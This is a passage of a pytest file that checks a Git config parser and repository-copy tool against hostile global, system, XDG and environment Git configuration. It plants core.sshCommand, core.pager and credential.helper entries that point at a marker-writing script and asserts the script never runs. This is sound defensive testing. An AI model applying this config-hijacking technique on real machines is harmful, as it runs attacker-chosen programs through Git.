    "GIT_CONFIG_KEY_0": "core.fsmonitor",
    "GIT_CONFIG_VALUE_0": "false",
}

_BROADER_CONFIG_SCOPE_FLAGS = frozenset(
    {"--global", "--system", "--worktree", "--show-origin", "--show-scope", "--includes"}
)


class _GitSubprocessCall:
    """One recorded ``subprocess.run`` invocation, as the product spelled it."""

    __slots__ = ("argv", "cwd", "environment", "environment_snapshot")

    def __init__(self, argv: tuple[str, ...], cwd, environment) -> None:
        self.argv = argv
        self.cwd = cwd
        # The live object proves aliasing; the snapshot proves call-time values.
        self.environment = environment
        self.environment_snapshot = None if environment is None else dict(environment)


class _GitSubprocessRecorder:
    def __init__(self) -> None:
        self.calls: list[_GitSubprocessCall] = []

    def reset(self) -> None:
        self.calls.clear()

    @property
    def config_listing_calls(self) -> list[_GitSubprocessCall]:
        """Every Git *config listing* call, however a mutant spells its scope."""

        return [
            call
            for call in self.calls
            if Path(call.argv[0]).name.casefold() in {"git", "git.exe"}
            and "config" in call.argv
            and any(item.startswith("--list") for item in call.argv)
        ]


@pytest.fixture()
def recorded_git_subprocesses(monkeypatch: pytest.MonkeyPatch) -> _GitSubprocessRecorder:
    """Record the real argv/environment, then delegate to the real execution."""

    recorder = _GitSubprocessRecorder()
    original_run = subprocess.run

    def recording_run(argv, *rest, **keywords):
        recorded = tuple(
            str(item) for item in (argv if isinstance(argv, (list, tuple)) else [argv])
        )
        recorder.calls.append(
            _GitSubprocessCall(recorded, keywords.get("cwd"), keywords.get("env"))
        )
        return original_run(argv, *rest, **keywords)

    monkeypatch.setattr(subprocess, "run", recording_run)
    return recorder


def _assert_parser_call_contract(call: _GitSubprocessCall) -> None:
    """The exact accepted local-listing authority and hardened child policy."""

    assert call.argv == _PARSER_ARGV, call.argv
    assert call.argv.count("--local") == 1, call.argv
    assert not (set(call.argv) & _BROADER_CONFIG_SCOPE_FLAGS), call.argv

    environment = call.environment_snapshot
    assert environment is not None, "the parser subprocess inherited an implicit environment"
    for name, value in _REQUIRED_CHILD_GIT_ENVIRONMENT.items():
        assert environment.get(name) == value, (name, environment.get(name))

    # An explicitly built child mapping -- neither the parent's own environment
    # nor the shared module-level policy dictionary.
    assert isinstance(call.environment, dict), type(call.environment)
    assert call.environment is not os.environ
    assert call.environment is not _HARDENED_GIT_ENVIRONMENT


def _record_parser_invocation(
    recorder: _GitSubprocessRecorder, repository: Path
) -> tuple[tuple, Exception | None]:
    """Invoke the real parser, keeping the recorded call observable either way.

    A command that no longer asks Git the accepted local-listing question can
    also make Git's own output unparseable.  The call contract must stay the
    deciding assertion, so the refusal is captured rather than propagated here
    and re-asserted after the contract has been checked.
    """

    recorder.reset()
    try:
        return native_canary_module._git_parsed_local_configuration(repository), None
    except NativeEvidenceInvalid as exc:
        return (), exc


def test_parsed_local_configuration_pins_its_argv_and_hardened_child_environment(
    tmp_path: Path,
    observed_network: _NetworkObservation,
    recorded_git_subprocesses: _GitSubprocessRecorder,
):
    repository = _external_repository(tmp_path / "parser-call-contract")
    _configure_ordinary_origin(repository)

    observed_network.reset()
    entries, failure = _record_parser_invocation(recorded_git_subprocesses, repository)

    listings = recorded_git_subprocesses.config_listing_calls
    assert len(listings) == 1, [call.argv for call in listings]
    _assert_parser_call_contract(listings[0])
    assert Path(str(listings[0].cwd)).resolve() == repository.resolve()

    assert failure is None, failure
    assert [entry.canonical_key for entry in entries]
    assert observed_network.argv == observed_network.git_argv


def test_parser_child_environment_is_freshly_built_for_every_invocation(
    tmp_path: Path, recorded_git_subprocesses: _GitSubprocessRecorder
):
    """A shared mutable environment would stay corrupted for the next child."""

    repository = _external_repository(tmp_path / "parser-unshared-environment")

    _, first_failure = _record_parser_invocation(recorded_git_subprocesses, repository)
    first = recorded_git_subprocesses.config_listing_calls[-1]
    _assert_parser_call_contract(first)
    assert first_failure is None, first_failure

    first.environment["GIT_CONFIG_NOSYSTEM"] = "0"
    first.environment["GIT_CONFIG_COUNT"] = "9"
    first.environment.pop("GIT_TERMINAL_PROMPT", None)

    _, second_failure = _record_parser_invocation(recorded_git_subprocesses, repository)
    second = recorded_git_subprocesses.config_listing_calls[-1]

    assert second.environment is not first.environment
    _assert_parser_call_contract(second)
    assert second_failure is None, second_failure


# --------------------------------------------------------------------------
# K. hostile non-local configuration control
#
# Every Git configuration scope the source parser does not own is made hostile
# at once.  This is why the call contract above exists: it is the behavioral
# demonstration, not the authority, for the single ``env=None`` mutation.
# --------------------------------------------------------------------------

_HOSTILE_EXTERNAL_KEYS = (
    "core.sshcommand",
    "core.pager",
    "credential.helper",
    "inertprobe.globalmarker",
    "inertprobe.systemmarker",
    "inertprobe.xdgmarker",
    "inertprobe.envmarker",
)


def _hostile_marker_program(root: Path) -> tuple[Path, Path]:
    """A real program that leaves a marker file if anything ever runs it."""

    root.mkdir(parents=True, exist_ok=True)
    marker = root / "hostile-executed.marker"
    if os.name == "nt":
        program = root / "hostile-locator.bat"
        program.write_text(f'@echo off\r\n> "{marker}" echo executed\r\n', encoding="ascii")
    else:
        program = root / "hostile-locator.sh"
        program.write_text(f'#!/bin/sh\necho executed > "{marker}"\n', encoding="ascii")
        program.chmod(0o755)
    return program, marker


def _inject_hostile_external_git_configuration(
    monkeypatch: pytest.MonkeyPatch, root: Path, program: Path
) -> None:
    """Point owner, system, XDG and environment Git configuration at a program."""

    root.mkdir(parents=True, exist_ok=True)
    locator = program.as_posix()
    global_config = root / "hostile-global.gitconfig"
    global_config.write_text(
        f"[core]\n\tsshCommand = {locator}\n\tpager = {locator}\n"
        f"[credential]\n\thelper = !{locator}\n"
        "[inertprobe]\n\tglobalmarker = hostile-global\n",
        encoding="utf-8",
    )
    system_config = root / "hostile-system.gitconfig"
    system_config.write_text(
        f"[core]\n\tsshCommand = {locator}\n"
        "[inertprobe]\n\tsystemmarker = hostile-system\n",
        encoding="utf-8",
    )
    xdg_home = root / "hostile-xdg"
    (xdg_home / "git").mkdir(parents=True, exist_ok=True)
    (xdg_home / "git" / "config").write_text(
        f"[core]\n\tsshCommand = {locator}\n"
        "[inertprobe]\n\txdgmarker = hostile-xdg\n",
        encoding="utf-8",
    )
    monkeypatch.delenv("GIT_CONFIG_NOSYSTEM", raising=False)
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(global_config))
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", str(system_config))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(xdg_home))
    monkeypatch.setenv("GIT_CONFIG_COUNT", "2")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.sshCommand")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", str(program))
    monkeypatch.setenv("GIT_CONFIG_KEY_1", "inertprobe.envmarker")
    monkeypatch.setenv("GIT_CONFIG_VALUE_1", "hostile-env")


def _unhardened_config_keys(repository: Path, environment: dict[str, str]) -> set[str]:
    """Control listing: what an unhardened, unscoped Git invocation would see."""

    completed = subprocess.run(
        ["git", "config", "--list", "--null"],
        cwd=repository,
        env=environment,
        shell=False,
        check=False,
        capture_output=True,
    )
    assert completed.returncode in {0, 1}, completed.stderr
    return {
        record.partition("\n")[0].casefold()
        for record in completed.stdout.decode("utf-8").split("\0")
        if record
    }


def test_hostile_external_git_configuration_never_enters_the_source_decision(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    observed_network: _NetworkObservation,
    recorded_git_subprocesses: _GitSubprocessRecorder,
):
    repository = _external_repository(tmp_path / "hostile-external-scopes")
    _configure_ordinary_origin(repository)
    head = _head(repository)
    expected_local = [key.casefold() for key, _ in _git_config_oracle(repository)]
    assert "remote.origin.url" in expected_local

    program, marker = _hostile_marker_program(tmp_path / "hostile-program")
    _inject_hostile_external_git_configuration(
        monkeypatch, tmp_path / "hostile-scopes", program
    )

    # Control: the injection is real -- an unhardened listing sees all of it.
    ambient = _unhardened_config_keys(repository, dict(os.environ))
    assert {
        "core.sshcommand",
        "inertprobe.globalmarker",
        "inertprobe.systemmarker",
        "inertprobe.envmarker",
    } <= ambient, ambient
    xdg_environment = dict(os.environ)
    xdg_environment.pop("GIT_CONFIG_GLOBAL", None)
    xdg_environment["HOME"] = str(tmp_path / "absent-home")
    xdg_environment["USERPROFILE"] = str(tmp_path / "absent-home")
    assert "inertprobe.xdgmarker" in _unhardened_config_keys(repository, xdg_environment)

    observed_network.reset()
    entries, failure = _record_parser_invocation(recorded_git_subprocesses, repository)
    assert recorded_git_subprocesses.config_listing_calls
    _assert_parser_call_contract(recorded_git_subprocesses.config_listing_calls[0])

    assert failure is None, failure
    assert [entry.canonical_key for entry in entries] == expected_local
    parsed = {entry.canonical_key for entry in entries}
    for hostile in _HOSTILE_EXTERNAL_KEYS:
        assert hostile not in parsed, hostile
    assert "core.fsmonitor" not in parsed

    # The complete source decision still accepts, on local metadata alone.
    _inspect_local_git_metadata(repository)
    assert _git_source_preflight(repository, head)[0] is True

    listings = recorded_git_subprocesses.config_listing_calls
    assert listings
    for call in listings:
        _assert_parser_call_contract(call)

    assert not marker.exists(), "a hostile configured program was executed"
    assert observed_network.argv == observed_network.git_argv
    for argv in observed_network.git_argv:
        assert not ({item.casefold() for item in argv[1:]} & _FORBIDDEN_GIT_VERBS), argv
        assert str(program) not in argv, argv
        assert program.as_posix() not in argv, argv


def test_parser_reports_exactly_the_repository_local_configuration(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    recorded_git_subprocesses: _GitSubprocessRecorder,
):
    """``--local`` is the exact scope: nothing wider, nothing collapsed."""

    repository = _external_repository(tmp_path / "exact-local-authority")
    _write_config(
        repository,
        _MINIMAL_CORE
        + '[remote "origin"]\n'
        + "\turl = https://a.invalid/one\n"
        + "\turl = https://a.invalid/two\n",
    )
    physical = native_canary_module._parse_local_git_config(repository / ".git" / "config")
    oracle = _git_config_oracle(repository)

    program, marker = _hostile_marker_program(tmp_path / "exact-local-program")
    _inject_hostile_external_git_configuration(
        monkeypatch, tmp_path / "exact-local-scopes", program
    )

    entries, failure = _record_parser_invocation(recorded_git_subprocesses, repository)

    listings = recorded_git_subprocesses.config_listing_calls
    assert len(listings) == 1, [call.argv for call in listings]
    _assert_parser_call_contract(listings[0])
    assert failure is None, failure

    observed = [(entry.canonical_key, entry.value) for entry in entries]
    assert observed == [(key.casefold(), value) for key, value in oracle]
    assert [key for key, _ in observed] == [entry.canonical_key for entry in physical]

    # Duplicate local entries stay independently visible, in file order.
    assert [value for key, value in observed if key == "remote.origin.url"] == [
        "https://a.invalid/one",
        "https://a.invalid/two",
    ]

    listed = {key for key, _ in observed}
    assert listed == {
        "core.repositoryformatversion",
        "core.filemode",
        "core.bare",
        "remote.origin.url",
    }
    # Command-line ``-c`` configuration is deliberately outside a local listing.
    assert "core.fsmonitor" not in listed
    for hostile in _HOSTILE_EXTERNAL_KEYS:
        assert hostile not in listed, hostile
    assert not marker.exists()


# --------------------------------------------------------------------------
# L. defense in depth on the target workspace
#
# Two target guards are normally shadowed by an earlier layer.  Each is pinned
# below under a controlled compound fault that disables only the earlier layer,
# so the guard under test is provably the deciding refusal.  Neither test is
# permission to weaken the layers in front of it.
# --------------------------------------------------------------------------


def test_target_subsection_rejection_decides_when_the_renderer_leaks_a_remote(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, observed_network: _NetworkObservation
):
    """Compound fault: the allowlist comparison agrees, subsections still refuse."""

    repository = _external_repository(tmp_path / "subsection-leak-source")
    _configure_ordinary_origin(repository)
    target = tmp_path / "subsection-leak-target"
    shutil.copytree(repository, target, copy_function=shutil.copy2, symlinks=False)

    leaked = ("remote", "url", AGENT_OS_ORIGIN_URL)
    original_settings = native_canary_module._normalized_target_config_settings
    original_render = native_canary_module._render_target_git_config

    def leaking_settings(copied_entries, hooks):
        # The expected-configuration layer is made to expect the leak, so it
        # cannot be the clause that refuses.
        return (*original_settings(copied_entries, hooks), leaked)

    def leaking_render(settings):
        assert leaked in settings
        body = original_render(tuple(item for item in settings if item != leaked))
        return body + f'[remote "origin"]\n\turl = {AGENT_OS_ORIGIN_URL}\n'.encode("utf-8")

    monkeypatch.setattr(
        native_canary_module, "_normalized_target_config_settings", leaking_settings
    )
    monkeypatch.setattr(native_canary_module, "_render_target_git_config", leaking_render)

    observed_network.reset()
    hooks, settings = native_canary_module._sanitize_target_git_metadata(target)

    entries = native_canary_module._parse_local_git_config(target / ".git" / "config")
    observed = tuple(
        (entry.section.casefold(), entry.name.casefold(), entry.value) for entry in entries
    )
    expected = tuple(
        (section.casefold(), name.casefold(), value) for section, name, value in settings
    )
    # The earlier allowlist comparison agrees exactly; only the subsection law
    # separates this target from acceptance.
    assert observed == expected
    assert [entry.canonical_key for entry in entries][-1] == "remote.origin.url"
    assert any(entry.subsection is not None for entry in entries)

    # Every other clause of the verification is satisfied in this scenario.
    assert list(os.scandir(hooks)) == []
    native_canary_module._inspect_local_git_metadata(target, allowed_hooks_path=hooks)
    environment = _hardened_git_environment()
    for name, value in _REQUIRED_CHILD_GIT_ENVIRONMENT.items():
        assert environment.get(name) == value, name
    configured_hooks = Path(
        native_canary_module._git_read_only(
            target, "config", "--local", "--get", "core.hooksPath"
        ).stdout.strip()
    )
    assert configured_hooks.resolve(strict=True) == hooks.resolve(strict=True)
    origins = native_canary_module._git_read_only(
        target, "config", "--show-origin", "--show-scope", "--list"
    ).stdout.splitlines()
    assert not any(line.casefold().startswith(("global\t", "system\t")) for line in origins)

    with pytest.raises(NativeEvidenceInvalid, match="differs from its allowlist"):
        native_canary_module._verify_sanitized_target_git_metadata(target, hooks, settings)

    assert observed_network.argv == observed_network.git_argv
    for argv in observed_network.git_argv:
        assert not ({item.casefold() for item in argv[1:]} & _FORBIDDEN_GIT_VERBS), argv


def test_final_target_remotes_gate_decides_when_sanitization_and_verification_fail(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, observed_network: _NetworkObservation
):
    """Compound fault: the last authority is ``target_observation.remotes``."""

    repository = _external_repository(tmp_path / "remotes-gate-source")
    _configure_ordinary_origin(repository)
    source_before = _observe_local_repository_source(repository)
    assert source_before.remotes

    destination = tmp_path / "remotes-gate-destination"
    destination.mkdir()

    original_sanitize = native_canary_module._sanitize_target_git_metadata
    original_observe = native_canary_module._observe_local_repository_source
    observations: list = []

    def leaking_sanitize(target):
        hooks, settings = original_sanitize(target)
        config = target / ".git" / "config"
        config.write_bytes(
            config.read_bytes()
            + f'[remote "origin"]\n\turl = {AGENT_OS_ORIGIN_URL}\n'.encode("utf-8")
        )
        return hooks, settings

    def recording_observe(repository_value, **keywords):
        observation = original_observe(repository_value, **keywords)
        observations.append(observation)
        return observation

    monkeypatch.setattr(
        native_canary_module, "_sanitize_target_git_metadata", leaking_sanitize
    )
    # The whole sanitized-config verification layer is simulated as failing.
    monkeypatch.setattr(
        native_canary_module,
        "_verify_sanitized_target_git_metadata",
        lambda *arguments, **keywords: None,
    )
    monkeypatch.setattr(
        native_canary_module, "_observe_local_repository_source", recording_observe
    )

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid, match="not clean and remote-free"):
        _materialize_local_repository_copy(
            profile=_profile(repository),
            destination_parent=destination,
            repository_name="work",
        )

    target = destination / "work"
    target_observations = [
        observation
        for observation in observations
        if Path(observation.repository).resolve() == target.resolve()
    ]
    assert len(target_observations) == 1
    target_observation = target_observations[0]

    # The surviving remote is the sole reason: every other condition standing
    # between this target and acceptance is already satisfied.
    assert target_observation.remotes
    assert target_observation.porcelain_status == ""
    assert target_observation.head == source_before.head
    assert target_observation.material_tree_hash == source_before.material_tree_hash
    assert target_observation.commit_count == source_before.commit_count
    assert (
        target_observation.complete_commit_message == source_before.complete_commit_message
    )
    assert (
        target_observation.worktree_material_tree_hash
        == source_before.worktree_material_tree_hash
    )

    assert not target.exists()
    assert _observe_local_repository_source(repository) == source_before
    assert observed_network.argv == observed_network.git_argv
    for argv in observed_network.git_argv:
        assert not ({item.casefold() for item in argv[1:]} & _FORBIDDEN_GIT_VERBS), argv

    assert not (destination / "work").exists()
